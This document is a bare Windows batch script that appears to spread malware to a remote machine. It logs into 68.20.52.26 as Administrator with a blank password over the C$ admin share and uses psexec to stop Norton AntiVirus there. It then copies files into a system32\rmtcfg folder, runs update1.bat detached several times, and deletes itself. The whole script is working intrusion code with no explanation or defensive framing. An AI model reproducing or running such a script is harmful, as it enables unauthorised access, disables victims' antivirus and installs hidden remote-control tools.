c:
cd\
cd c:\winnt\system32\rmtcfg\files\copy
copy rmtcfg.cfg c:\winnt\system32\rmtcfg\files\hm
c:
cd\
cd c:\winnt\system32\rmtcfg\files\hm
net use z: /delete
net use \\68.20.52.26 /USER:Administrator
net use z: \\68.20.52.26\C$
psexec \\68.20.52.26 -u Administrator -p "" net stop "Norton AntiVirus Server"
psexec \\68.20.52.26 -u Administrator -p "" -c temp.bat
mkdir z:\winnt\system32\rmtcfg
copy c:\winnt\system32\rmtcfg\files\hm\*.* z:\winnt\system32\rmtcfg
net use z: /delete
net use \\68.20.52.26 /delete
psexec \\68.20.52.26 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update1.bat
psexec \\68.20.52.26 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update1.bat
psexec \\68.20.52.26 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update1.bat
psexec \\68.20.52.26 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update1.bat
del runme123849.bat
